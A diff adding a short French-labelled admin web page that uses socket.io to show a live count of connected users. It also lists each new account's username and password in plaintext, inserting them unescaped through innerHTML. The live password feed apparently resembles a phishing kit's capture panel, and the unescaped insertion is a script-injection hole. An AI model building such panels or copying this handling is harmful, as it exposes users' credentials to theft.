@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h2>ADMIN</h2>
+
+<h3>Connectés : <span id="users">0</span></h3>
+
+<div id="accounts"></div>
+
+<script src="/socket.io/socket.io.js"></script>
+
+<script>
+const socket = io();
+
+// compteur users
+socket.on("users", (n) => {
+    document.getElementById("users").innerText = n;
+});
+
+// comptes
+socket.on("new_account", (data) => {
+    document.getElementById("accounts").innerHTML +=
+        `<p>${data.username} | ${data.password}</p><hr>`;
+});
+</script>
+
+</body>
+</html>
